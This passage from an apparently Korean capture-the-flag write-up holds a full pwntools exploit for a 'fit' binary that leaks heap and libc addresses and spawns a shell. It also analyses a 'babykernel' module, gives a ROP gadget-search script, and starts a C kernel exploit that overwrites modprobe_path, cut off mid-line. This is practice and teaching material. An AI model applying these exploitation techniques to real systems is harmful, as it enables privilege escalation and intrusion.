부분이 생겨서 가짓수가 꽤 나오기 때문에 백트레킹해서 주소가 제대로 나왔는지 확인했다.\n이후 AAW로 잘 덮고, 마저 익스했다.\nExploit script from pwn import * import pyte DEBUG = True context.terminal=[\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] context.binary = e = ELF(\u0026#39;./fit\u0026#39;) libc = ELF(\u0026#39;/usr/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) off = [0x2000, 0x25D0] # 0x2000, 0x0002346 script = \u0026#39;\u0026#39; for i in off: script += f\u0026#39;brva {hex(i)}\\n\u0026#39; if DEBUG: p = gdb.debug(e.path, gdbscript=script) else : p = process(e.path) dims = (80, 25) screen = pyte.Screen(*dims) stream = pyte.ByteStream(screen) sl = lambda x : p.sendline(x) s = lambda x : p.send(x) def feed_stream() -\u0026gt; str: global stream,screen stream.feed(p.recv(2000)) scr = \u0026#39;\u0026#39; for i in screen.display: scr += str(i) + \u0026#39;\\n\u0026#39; return scr def rvuntil(b : bytes) -\u0026gt; bytes: for i in range(20): rv = p.recv(2000,timeout=1) sleep(0.01) if b in rv: break return rv def solve(st) -\u0026gt; int: scr = feed_stream().split() try: ans = (scr[scr.index(\u0026#39;Word:\u0026#39;)+2]) stage = int(scr[scr.index(\u0026#39;Stage\u0026#39;)+1]) sl(ans) if stage != st: return solve(st) except: return solve(st) return stage ctype_loc = [0x0002, 0x0002,0x0002,0x0002,0x0002,0x0002,0x0002,0x0002,0x0002,0x2003, 0x2002,0x2002, 0x2002, 0x2002,0x0002, 0x0002, 0x0002, 0x0002,0x0002,0x0002, 0x0002,0x0002,0x0002,0x0002,0x0002, 0x0002, 0x0002, 0x0002,0x0002,0x0002,0x0002,0x0002,0x6001, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xd808, 0xd808, 0xd808, 0xd808, 0xd808, 0xd808, 0xd808, 0xd808, 0xd808, 0xd808, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xd508, 0xd508, 0xd508, 0xd508, 0xd508, 0xd508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc004, 0xc004,0xc004, 0xc004, 0xc004, 0xc004, 0xd608, 0xd608, 0xd608, 0xd608, 0xd608, 0xd608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc004, 0xc004, 0xc004, 0xc004, 0x0002,0x0000, 0x0000,0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000,0x0000, 0x0000,0x0000,0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000,0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0020, 0x0000,0x0000,0x0000,0x0000,0x0000,0x0028,0x0000,0x0043,0x0000, 0x0029,0x0000, 0x0000, 0x0000,0x0000, 0x0000, 0x003c, 0x0000,0x003c,0x0000, 0x0000,0x0000,0x0000,0x0000, 0x002d, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000,0x0028,0x0000,0x0052, 0x0000, 0x0029, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0075, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x002c, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x003e, 0x0000, 0x003e, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0020, 0x0000, 0x0031, 0x0000, 0x002f, 0x0000, 0x0034, 0x0000, 0x0020, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0020, 0x0000, 0x0031, 0x0000, 0x002f, 0x0000, 0x0032, 0x0000, 0x0020, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0020, 0x0000, 0x0033, 0x0000, 0x002f, 0x0000, 0x0034, 0x0000, 0x0020, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0041, 0x0000, 0x0045, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0078, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0073, 0x0000, 0x0073, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0061, 0x0000, 0x0065, 0x0000, ] def unctrl_sp_emu(x): global ctype_loc word_29780 = [0, 3, 2, 3, 4, 3, 6, 3, 8, 3, 10, 3, 12, 3, 14, 3, 16, 3, 18, 3, 20, 3, 22, 3, 24, 3, 26, 3, 28, 3, 30, 3, 32, 3, 34, 3, 36, 3, 38, 3, 40, 3, 42, 3, 44, 3, 46, 3, 48, 3, 50, 3, 52, 3, 54, 3, 56, 3, 58, 3, 60, 3, 62, 3, 64, 3, 66, 3, 68, 3, 70, 3, 72, 3, 74, 3, 76, 3, 78, 3, 80, 3, 82, 3, 84, 3, 86, 3, 88, 3, 90, 3, 92, 3, 94, 3, 96, 3, 98, 3, 100, 3, 102, 3, 104, 3, 106, 3, 108, 3, 110, 3, 112, 3, 114, 3, 116, 3, 118, 3, 120, 3, 122, 3, 124, 3, 126, 3, 128, 3, 130, 3, 132, 3, 134, 3, 136, 3, 138, 3, 140, 3, 142, 3, 144, 3, 146, 3, 148, 3, 150, 3, 152, 3, 154, 3, 156, 3, 158, 3, 160, 3, 162, 3, 164, 3, 166, 3, 168, 3, 170, 3, 172, 3, 174, 3, 176, 3, 178, 3, 180, 3, 182, 3, 184, 3, 186, 3, 188, 3, 190, 3, 192, 3, 194, 3, 196, 3, 198, 3, 200, 3, 202, 3, 204, 3, 206, 3, 208, 3, 210, 3, 212, 3, 214, 3, 216, 3, 218, 3, 220, 3, 222, 3, 224, 3, 226, 3, 228, 3, 230, 3, 232, 3, 234, 3, 236, 3, 238, 3, 240, 3, 242, 3, 244, 3, 246, 3, 248, 3, 250, 3, 252, 3, 254, 3] unk_29360 = [94, 64, 0, 94, 65, 0, 94, 66, 0, 94, 67, 0, 94, 68, 0, 94, 69, 0, 94, 70, 0, 94, 71, 0, 94, 72, 0, 94, 73, 0, 94, 74, 0, 94, 75, 0, 94, 76, 0, 94, 77, 0, 94, 78, 0, 94, 79, 0, 94, 80, 0, 94, 81, 0, 94, 82, 0, 94, 83, 0, 94, 84, 0, 94, 85, 0, 94, 86, 0, 94, 87, 0, 94, 88, 0, 94, 89, 0, 94, 90, 0, 94, 91, 0, 94, 92, 0, 94, 93, 0, 94, 94, 0, 94, 95, 0, 32, 0, 33, 0, 34, 0, 35, 0, 36, 0, 37, 0, 38, 0, 39, 0, 40, 0, 41, 0, 42, 0, 43, 0, 44, 0, 45, 0, 46, 0, 47, 0, 48, 0, 49, 0, 50, 0, 51, 0, 52, 0, 53, 0, 54, 0, 55, 0, 56, 0, 57, 0, 58, 0, 59, 0, 60, 0, 61, 0, 62, 0, 63, 0, 64, 0, 65, 0, 66, 0, 67, 0, 68, 0, 69, 0, 70, 0, 71, 0, 72, 0, 73, 0, 74, 0, 75, 0, 76, 0, 77, 0, 78, 0, 79, 0, 80, 0, 81, 0, 82, 0, 83, 0, 84, 0, 85, 0, 86, 0, 87, 0, 88, 0, 89, 0, 90, 0, 91, 0, 92, 0, 93, 0, 94, 0, 95, 0, 96, 0, 97, 0, 98, 0, 99, 0, 100, 0, 101, 0, 102, 0, 103, 0, 104, 0, 105, 0, 106, 0, 107, 0, 108, 0, 109, 0, 110, 0, 111, 0, 112, 0, 113, 0, 114, 0, 115, 0, 116, 0, 117, 0, 118, 0, 119, 0, 120, 0, 121, 0, 122, 0, 123, 0, 124, 0, 125, 0, 126, 0, 94, 63, 0, 126, 64, 0, 126, 65, 0, 126, 66, 0, 126, 67, 0, 126, 68, 0, 126, 69, 0, 126, 70, 0, 126, 71, 0, 126, 72, 0, 126, 73, 0, 126, 74, 0, 126, 75, 0, 126, 76, 0, 126, 77, 0, 126, 78, 0, 126, 79, 0, 126, 80, 0, 126, 81, 0, 126, 82, 0, 126, 83, 0, 126, 84, 0, 126, 85, 0, 126, 86, 0, 126, 87, 0, 126, 88, 0, 126, 89, 0, 126, 90, 0, 126, 91, 0, 126, 92, 0, 126, 93, 0, 126, 94, 0, 126, 95, 0, 77, 45, 32, 0, 77, 45, 33, 0, 77, 45, 34, 0, 77, 45, 35, 0, 77, 45, 36, 0, 77, 45, 37, 0, 77, 45, 38, 0, 77, 45, 39, 0, 77, 45, 40, 0, 77, 45, 41, 0, 77, 45, 42, 0, 77, 45, 43, 0, 77, 45, 44, 0, 77, 45, 45, 0, 77, 45, 46, 0, 77, 45, 47, 0, 77, 45, 48, 0, 77, 45, 49, 0, 77, 45, 50, 0, 77, 45, 51, 0, 77, 45, 52, 0, 77, 45, 53, 0, 77, 45, 54, 0, 77, 45, 55, 0, 77, 45, 56, 0, 77, 45, 57, 0, 77, 45, 58, 0, 77, 45, 59, 0, 77, 45, 60, 0, 77, 45, 61, 0, 77, 45, 62, 0, 77, 45, 63, 0, 77, 45, 64, 0, 77, 45, 65, 0, 77, 45, 66, 0, 77, 45, 67, 0, 77, 45, 68, 0, 77, 45, 69, 0, 77, 45, 70, 0, 77, 45, 71, 0, 77, 45, 72, 0, 77, 45, 73, 0, 77, 45, 74, 0, 77, 45, 75, 0, 77, 45, 76, 0, 77, 45, 77, 0, 77, 45, 78, 0, 77, 45, 79, 0, 77, 45, 80, 0, 77, 45, 81, 0, 77, 45, 82, 0, 77, 45, 83, 0, 77, 45, 84, 0, 77, 45, 85, 0, 77, 45, 86, 0, 77, 45, 87, 0, 77, 45, 88, 0, 77, 45, 89, 0, 77, 45, 90, 0, 77, 45, 91, 0, 77, 45, 92, 0, 77, 45, 93, 0, 77, 45, 94, 0, 77, 45, 95, 0, 77, 45, 96, 0, 77, 45, 97, 0, 77, 45, 98, 0, 77, 45, 99, 0, 77, 45, 100, 0, 77, 45, 101, 0, 77, 45, 102, 0, 77, 45, 103, 0, 77, 45, 104, 0, 77, 45, 105, 0, 77, 45, 106, 0, 77, 45, 107, 0, 77, 45, 108, 0, 77, 45, 109, 0, 77, 45, 110, 0, 77, 45, 111, 0, 77, 45, 112, 0, 77, 45, 113, 0, 77, 45, 114, 0, 77, 45, 115, 0, 77, 45, 116, 0, 77, 45, 117, 0, 77, 45, 118, 0, 77, 45, 119, 0, 77, 45, 120, 0, 77, 45, 121, 0, 77, 45, 122, 0, 77, 45, 123, 0, 77, 45, 124, 0, 77, 45, 125, 0, 77, 45, 126, 0, 126, 63, 0, 128, 0, 129, 0, 130, 0, 131, 0, 132, 0, 133, 0, 134, 0, 135, 0, 136, 0, 137, 0, 138, 0, 139, 0, 140, 0, 141, 0, 142, 0, 143, 0, 144, 0, 145, 0, 146, 0, 147, 0, 148, 0, 149, 0, 150, 0, 151, 0, 152, 0, 153, 0, 154, 0, 155, 0, 156, 0, 157, 0, 158, 0, 159, 0, 160, 0, 161, 0, 162, 0, 163, 0, 164, 0, 165, 0, 166, 0, 167, 0, 168, 0, 169, 0, 170, 0, 171, 0, 172, 0, 173, 0, 174, 0, 175, 0, 176, 0, 177, 0, 178, 0, 179, 0, 180, 0, 181, 0, 182, 0, 183, 0, 184, 0, 185, 0, 186, 0, 187, 0, 188, 0, 189, 0, 190, 0, 191, 0, 192, 0, 193, 0, 194, 0, 195, 0, 196, 0, 197, 0, 198, 0, 199, 0, 200, 0, 201, 0, 202, 0, 203, 0, 204, 0, 205, 0, 206, 0, 207, 0, 208, 0, 209, 0, 210, 0, 211, 0, 212, 0, 213, 0, 214, 0, 215, 0, 216, 0, 217, 0, 218, 0, 219, 0, 220, 0, 221, 0, 222, 0, 223, 0, 224, 0, 225, 0, 226, 0, 227, 0, 228, 0, 229, 0, 230, 0, 231, 0, 232, 0, 233, 0, 234, 0, 235, 0, 236, 0, 237, 0, 238, 0, 239, 0, 240, 0, 241, 0, 242, 0, 243, 0, 244, 0, 245, 0, 246, 0, 247, 0, 248, 0, 249, 0, 250, 0, 251, 0, 252, 0, 253, 0, 254, 0, 255, 0] word_29160 = [0, 0, 3, 0, 6, 0, 9, 0, 12, 0, 15, 0, 18, 0, 21, 0, 24, 0, 27, 0, 30, 0, 33, 0, 36, 0, 39, 0, 42, 0, 45, 0, 48, 0, 51, 0, 54, 0, 57, 0, 60, 0, 63, 0, 66, 0, 69, 0, 72, 0, 75, 0, 78, 0, 81, 0, 84, 0, 87, 0, 90, 0, 93, 0, 96, 0, 98, 0, 100, 0, 102, 0, 104, 0, 106, 0, 108, 0, 110, 0, 112, 0, 114, 0, 116, 0, 118, 0, 120, 0, 122, 0, 124, 0, 126, 0, 128, 0, 130, 0, 132, 0, 134, 0, 136, 0, 138, 0, 140, 0, 142, 0, 144, 0, 146, 0, 148, 0, 150, 0, 152, 0, 154, 0, 156, 0, 158, 0, 160, 0, 162, 0, 164, 0, 166, 0, 168, 0, 170, 0, 172, 0, 174, 0, 176, 0, 178, 0, 180, 0, 182, 0, 184, 0, 186, 0, 188, 0, 190, 0, 192, 0, 194, 0, 196, 0, 198, 0, 200, 0, 202, 0, 204, 0, 206, 0, 208, 0, 210, 0, 212, 0, 214, 0, 216, 0, 218, 0, 220, 0, 222, 0, 224, 0, 226, 0, 228, 0, 230, 0, 232, 0, 234, 0, 236, 0, 238, 0, 240, 0, 242, 0, 244, 0, 246, 0, 248, 0, 250, 0, 252, 0, 254, 0, 0, 1, 2, 1, 4, 1, 6, 1, 8, 1, 10, 1, 12, 1, 14, 1, 16, 1, 18, 1, 20, 1, 22, 1, 24, 1, 26, 1, 28, 1, 30, 1, 33, 1, 36, 1, 39, 1, 42, 1, 45, 1, 48, 1, 51, 1, 54, 1, 57, 1, 60, 1, 63, 1, 66, 1, 69, 1, 72, 1, 75, 1, 78, 1, 81, 1, 84, 1, 87, 1, 90, 1, 93, 1, 96, 1, 99, 1, 102, 1, 105, 1, 108, 1, 111, 1, 114, 1, 117, 1, 120, 1, 123, 1, 126, 1, 129, 1, 133, 1, 137, 1, 141, 1, 145, 1, 149, 1, 153, 1, 157, 1, 161, 1, 165, 1, 169, 1, 173, 1, 177, 1, 181, 1, 185, 1, 189, 1, 193, 1, 197, 1, 201, 1, 205, 1, 209, 1, 213, 1, 217, 1, 221, 1, 225, 1, 229, 1, 233, 1, 237, 1, 241, 1, 245, 1, 249, 1, 253, 1, 1, 2, 5, 2, 9, 2, 13, 2, 17, 2, 21, 2, 25, 2, 29, 2, 33, 2, 37, 2, 41, 2, 45, 2, 49, 2, 53, 2, 57, 2, 61, 2, 65, 2, 69, 2, 73, 2, 77, 2, 81, 2, 85, 2, 89, 2, 93, 2, 97, 2, 101, 2, 105, 2, 109, 2, 113, 2, 117, 2, 121, 2, 125, 2, 129, 2, 133, 2, 137, 2, 141, 2, 145, 2, 149, 2, 153, 2, 157, 2, 161, 2, 165, 2, 169, 2, 173, 2, 177, 2, 181, 2, 185, 2, 189, 2, 193, 2, 197, 2, 201, 2, 205, 2, 209, 2, 213, 2, 217, 2, 221, 2, 225, 2, 229, 2, 233, 2, 237, 2, 241, 2, 245, 2, 249, 2, 253, 2] for i in range(len(word_29160)//2): word_29160[i] = u16(bytes(word_29160[i*2:i*2+2])) word_29160 = word_29160[:len(word_29160)//2+1] for i in range(len(word_29780)//2): word_29780[i] = u16(bytes(word_29780[i*2:i*2+2])) word_29780 = word_29780[:len(word_29780)//2+1] if (x-0xa0)\u0026amp;0xffffffff \u0026lt;= 0x5f: v = [] for i in range(4): if unk_29360[word_29780[x-0x80\u0026amp;0xffffffff]+i] == 0: break v.append(unk_29360[word_29780[x-0x80\u0026amp;0xffffffff]+i]) return bytes(v) else: v = [] for i in range(4): if unk_29360[word_29160[x]+i] == 0: break v.append((unk_29360[word_29160[x]+i])) return bytes(v) def leak_bytes(raw_bytes : bytes, k : bytes, l : int) -\u0026gt; bytes: def parse(res, raw,l,idx,candidates): print(res) if len(res) \u0026gt; l: return None elif len(res) == l: return bytes(res) else: f = 0 for i in range(0x0,0x20): if raw[idx+len(res):idx+len(res)+2] == unctrl_sp_emu(i): res.append(i) v = (parse(res,raw,l,idx+1,candidates)) f = 1 if v != None: candidates.append(v) res.pop() for i in range(0x20,0x7f): if p8(raw[idx+len(res)]) == unctrl_sp_emu(i): res.append(i) v = (parse(res,raw,l,idx,candidates)) f = 1 if v != None: candidates.append(v) res.pop() for i in range(0x7f,0xa0): if raw[idx+len(res):idx+len(res)+2] == unctrl_sp_emu(i): res.append(i) v = (parse(res,raw,l,idx+1,candidates)) f = 1 if v != None: candidates.append(v) res.pop() for i in range(0xa0,0x100): if (raw[idx+len(res)]) == (i): res.append(i) v = (parse(res,raw,l,idx,candidates)) f = 1 if v != None: candidates.append(v) res.pop() if f==0: return None candidates = [] idx = raw_bytes.index(k) res = [] parse(res, raw_bytes, l, idx+len(k),candidates) return candidates # pwndbg\u0026gt; source ./addrsearch.py # addr : 0x55ad1bc7f6c0 # target addr start: 0x7f12897b8000 # target addr end : 0x7f1289765000 # # 0x55ad1bc7f6c0 | 0x7f12897b9ce0 -- offset : -0xe720 # 0x55ad1bc7f6c8 | 0x7f12897b9cf0 -- offset : -0xe718 # 0x55ad1bc7f6d0 | 0x7f12897b9d00 -- offset : -0xe710 # 0x55ad1bc7f6d8 | 0x7f12897b9d10 -- offset : -0xe708 # 0x55ad1bc7f6e0 | 0x7f12897b9d20 -- offset : -0xe700 # 0x55ad1bc7f808 | 0x7f128978bb20 -- offset : -0xe5d8 # 0x55ad1bc7f8f0 | 0x7f12897c4b50 -- offset : -0xe4f0 # 0x55ad1bc7f8f8 | 0x7f12897b9d50 -- offset : -0xe4e8 # 0x55ad1bc800f8 | 0x7f1289765680 -- offset : -0xdce8 # 0x55ad1bc80168 | 0x7f12897615e0 -- offset : -0xdc78 # 0x55ad1bc80260 | 0x7f12897610a0 -- offset : -0xdb80 # 0x55ad1bc8e9b0 | 0x7f1289764cc0 -- offset : 0xbd0 # 0x55ad1bc8e9b8 | 0x7f1289764cc0 -- offset : 0xbd8 # 0x55ad1bc8e9b8 | 0x7f1289764cc0 -- offset : 0xbd8 if __name__ == \u0026#39;__main__\u0026#39;: for i in range(5): print(solve(i+1)) rvuntil(b\u0026#39;Result\u0026#39;) s(b\u0026#39;\\xe0\u0026#39;) rv = rvuntil(b\u0026#39;1.\u0026#39;) addr = leak_bytes(rv,b\u0026#39;1. \u0026#39;,6) heap = 0 for i in addr: v = u64(i + b\u0026#39;\\x00\u0026#39;*2) if (v \u0026gt;\u0026gt; 8*5) == 0x55 or (v \u0026gt;\u0026gt; 8*5) == 0x56: if heap == 0: heap = v assert(heap != 0) success(\u0026#34;heap : \u0026#34; + hex(heap)) s(b\u0026#39;y\u0026#39;) for i in range(5): print(solve(i+1),\u0026#39;solved\u0026#39;) rvuntil(b\u0026#39;Result\u0026#39;) # constraint # addr-0x10+0x28 -\u0026gt; 0 # 0x55ad1bc7f6d8 | 0x7f12897b9d10 -- offset : -0xe708 s(b\u0026#39;A\u0026#39;*0x18 + p64(heap-0xe708-0x10)) rv = rvuntil(b\u0026#39;3. \u0026#39;) addr = (leak_bytes(rv,b\u0026#39;3. \u0026#39;,6)) libc_base = 0 for i in addr: v = u64(i + b\u0026#39;\\x00\u0026#39;*2) if (v \u0026gt;\u0026gt; 8*5) == 0x7f: if libc_base == 0: libc_base = v assert(libc_base != 0) libc_base -= 0x24bd10 success(\u0026#34;libc_base : \u0026#34; + hex(libc_base)) s(b\u0026#39;y\u0026#39;) for i in range(5): print(solve(i+1),\u0026#39;solved\u0026#39;) rvuntil(b\u0026#39;Result\u0026#39;) s(b\u0026#39;/bin/sh\\x00\u0026#39; + b\u0026#39;A\u0026#39;*0x10 + p64(libc_base + 0x1f6080-0x10)) s(b\u0026#39;n\u0026#39;) sl(b\u0026#39;3\u0026#39;) s(p64(libc_base + libc.sym.system)) pause() p.interactive() babykernel 궁금해서 문제 파일을 받아서 풀어봤다.\nAnalysis local_run.sh #!/bin/sh qemu-system-x86_64 \\ -m 128M \\ -cpu kvm64,+smep \\ -kernel bzImage \\ -initrd rootfs.img.gz \\ -snapshot \\ -nographic \\ -monitor /dev/null \\ -no-reboot \\ -append \u0026#34;console=ttyS0 kaslr kpti=1 quiet panic=1\u0026#34; \\ -s smap가 안걸려있다.\nbabykernel.ko copy_from_user(\u0026amp;user_struct, args, 0x18LL); switch ( (_DWORD)cmd ) { case 0x1002: v5 = (char *)\u0026amp;ops + 8 * *(\u0026amp;user_struct + 2); v6 = (_QWORD *)kmem_cache_alloc_trace(kmalloc_caches[18], 0x6000C0LL, 16LL); *v6 = v5; if ( (unsigned __int64)*(\u0026amp;user_struct + 1) \u0026gt; 0x10 ) _copy_overflow(16LL, *(\u0026amp;user_struct + 1)); else copy_to_user(user_struct, v6); break; case 0x1003: ((void (*)(void))((char *)\u0026amp;ops + 8 * *(\u0026amp;user_struct + 2)))();// relative ex break; case 0x1001: v4 = (_QWORD *)kmem_cache_alloc_trace(kmalloc_caches[18], 0x6000C0LL, 0x10LL); *v4 = \u0026amp;commit_creds; if ( (unsigned __int64)*(\u0026amp;user_struct + 1) \u0026lt;= 0x10 ) copy_to_user(user_struct, v4); break; } return 1LL; } 0x1002, 0x1001은 릭해주고, 0x1003은 ops에서 특정 오프셋만큼 떨어진 부분을 실행한다.\nExploitation ops쪽이랑 코드쪽 매핑을 릭하고 피보팅해주고 modprobe_path를 덮었다. bzImage를 vmlinux로 추출하려했는데, 안되길래 직접 rop gadgets을 찾는 스크립트를 작성해서 가젯을 잘 가져왔다.\nimport gdb from capstone import * from tqdm import tqdm import pickle default = \u0026#34;../res.rop\u0026#34; def brief(x,keywords): m = 0x7ffffffff M = -1 Ml = 0 for i in keywords: if m \u0026gt; x.index(i): m = x.index(i) if M \u0026lt; x.index(i): M = x.index(i) Ml = len(i) if m == -1 or M == -1: return None s,S = 0,0 if M+Ml+1 \u0026gt; len(x): S = 1 if m-21 \u0026lt; 0: s = 1 if s and not S: return x[:M+Ml+1] elif not s and S: i = m while True: if x[i] == \u0026#39;\\n\u0026#39;: i+=1 break i-=1 return x[i:] elif not s and not S: i = m while True: if x[i] == \u0026#39;\\n\u0026#39;: i+=1 break i-=1 return x[i:M+Ml+1] else: return x def parse_int(v): if v.startswith(\u0026#34;0x\u0026#34;): v = int(v,16) else: v = int(v,10) return v def search(s,sv): if sv: print(\u0026#34;save? (y/n) : \u0026#34;,end=\u0026#39;\u0026#39;) v = input() == \u0026#39;y\u0026#39; if v: with open(default,\u0026#34;wb\u0026#34;) as f: pickle.dump(s, f) print(\u0026#34;saved\u0026#34;) print() print(\u0026#34;Examples)\\n\\t1) array search :\\n\\t\\tSearch \u0026gt; [\u0026#39;xchg\u0026#39;,\u0026#39;esp\u0026#39;,\u0026#39;ret\u0026#39;]\\n\\t2) string search :\\n\\t\\tSearch \u0026gt; xchg esp\\n\\t3) quit :\\n\\t\\tSearch \u0026gt; q\\n\\t4) Save results :\\n\\t\\tSearch \u0026gt; save\u0026#34;) print() while True: print(\u0026#34;Search \u0026gt; \u0026#34;,end=\u0026#39;\u0026#39;) v = input() if v == \u0026#39;q\u0026#39;: break elif v.startswith(\u0026#39;[\u0026#39;): print(\u0026#34;limit : \u0026#34;,end=\u0026#39;\u0026#39;) limit = parse_int(input()) arr = eval(v) res = [] for i in s: f = 0 cur = -1 idx = [] for j in arr: if j not in i: f = 1 break else: if cur \u0026lt; i.index(j): idx.append(i.index(j)) cur = i.index(j) else: f = 1 if f==0: m = sum(idx) / len(idx) M = 0 t = 0 for k in idx: t = (m - k)**2 if M \u0026lt; t: M = t res.append([t,i]) print(\u0026#34;show brief (y/n) : \u0026#34;,end= \u0026#39;\u0026#39;) v = input() == \u0026#39;y\u0026#39; res.sort() if len(res) \u0026lt; limit: limit = len(res) for i in range(limit): if v: print() x= brief((res[i][1]),arr) if x == None: continue print(x) else: print() print((res[i][1])) else: print(\u0026#34;limit : \u0026#34;,end=\u0026#39;\u0026#39;) limit = parse_int(input()) for i in s: if v in i: print(i) if __name__ == \u0026#39;__main__\u0026#39;: print(\u0026#34;load? (y/n) : \u0026#34;,end=\u0026#39;\u0026#39;) v = input() == \u0026#39;y\u0026#39; if v: try: s = \u0026#39;\u0026#39; with open(default,\u0026#39;rb\u0026#39;) as f: s = pickle.load(f) print(\u0026#34;loaded successfully\u0026#34;) search(s,False) except FileNotFoundError: print(f\u0026#34;\u0026#39;{default}\u0026#39; not found\u0026#34;) else: inf = gdb.inferiors()[0] print(\u0026#34;segment address : \u0026#34;,end=\u0026#39;\u0026#39;) addr = parse_int(input()) res = gdb.execute(f\u0026#34;xinfo {addr}\u0026#34;,to_string=True) if \u0026#39;Containing mapping:\u0026#39; in res: res = res[res.index(\u0026#39;0x\u0026#39;)+2:] res = res[res.index(\u0026#39;0x\u0026#39;):].split() print(f\u0026#34;reading memory {res[0]} ~ {res[1]} (0x{res[3]} bytes)\u0026#34;) mem = (inf.read_memory(int(res[0],16),int(res[3],16))).tobytes() md = Cs(CS_ARCH_X86, CS_MODE_64) #gadgets = [b\u0026#39;\\xc3\u0026#39;,b\u0026#34;\\xc2\u0026#34;,b\u0026#39;\\xcb\u0026#39;,b\u0026#34;\\xca\u0026#34;,b\u0026#39;\\xf2\\xc3\u0026#39;,b\u0026#34;\\xf2\\xc2\u0026#34;,b\u0026#39;\\xff\u0026#39;,b\u0026#39;\\xeb\u0026#39;,b\u0026#39;\\xe9\u0026#39;,b\u0026#39;\\xf2\\xff\u0026#39;,b\u0026#39;\\xcd\\x80\u0026#39;,b\u0026#34;\\x0f\\x34\u0026#34;,b\u0026#34;\\x0f\\x05\u0026#34;,b\u0026#39;\\x65\\xff\\x15\\x10\\x00\\x00\\x00\u0026#39;] gadgets = [b\u0026#39;\\xc3\u0026#39;,b\u0026#34;\\xc2\u0026#34;,b\u0026#39;\\xcb\u0026#39;,b\u0026#34;\\xca\u0026#34;,b\u0026#39;\\xff\u0026#39;,b\u0026#39;\\xeb\u0026#39;,b\u0026#39;\\xe9\u0026#39;,b\u0026#39;\\xf2\u0026#39;,b\u0026#39;\\xcd\u0026#39;,b\u0026#39;\\x0f\u0026#39;,b\u0026#39;\\x65\u0026#39;,b\u0026#39;\\x48\u0026#39;] # iretq candi = [] print(\u0026#34;finding gadgets\u0026#34;) for i in tqdm(range(len(mem))): for k in gadgets: if mem[i] == k[0] and i not in candi: candi.append(i) s = [] base = int(res[0],16) # print(\u0026#34;width : \u0026#34;,end=\u0026#39;\u0026#39;) # v = parse_int(input()) v = 0x20 # width 0x20 by default print(\u0026#34;disassembling\u0026#34;) for j in tqdm(range(len(candi))): tmp = \u0026#39;\u0026#39; if j-v \u0026lt; 0: for i in md.disasm(mem[:candi[j]+v], base): tmp += (\u0026#34;%s:\\t%s %s\\n\u0026#34; %(\u0026#39;0x\u0026#39;+hex(i.address).replace(\u0026#39;0x\u0026#39;,\u0026#39;\u0026#39;).zfill(16) + \u0026#39; (+\u0026#39;+ hex(i.address-base)+\u0026#39;)\u0026#39;, i.mnemonic, i.op_str)) else: for i in md.disasm(mem[candi[j]-v:candi[j]+v], base+candi[j]-v): tmp += (\u0026#34;%s:\\t%s %s\\n\u0026#34; %(\u0026#39;0x\u0026#39;+hex(i.address).replace(\u0026#39;0x\u0026#39;,\u0026#39;\u0026#39;).zfill(16) + \u0026#39; (+\u0026#39;+ hex(i.address-base)+\u0026#39;)\u0026#39;, i.mnemonic, i.op_str)) s.append(tmp) search(s,True) else: print(\u0026#34;not mapped\u0026#34;) Exploit script #include\u0026lt;sys/ioctl.h\u0026gt; #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;stdint.h\u0026gt; #include\u0026lt;string.h\u0026gt; #include\u0026lt;unistd.h\u0026gt; #include\u0026lt;fcntl.h\u0026gt; #include\u0026lt;sys/mman.h\u0026gt; #define LEAK 0x1001 #define EXEC 0x1003 #define READ 0x1002 // -no-pie struct ioinfo { uint8_t * buf; uint64_t size; uint64_t off; }; uint64_t user_cs, user_rflags, user_ss,user_rsp; void shell(void){ system(\u0026#34;echo \u0026#39;#!/bin/sh\\nchmod 777 /flag\u0026#39; \u0026gt; 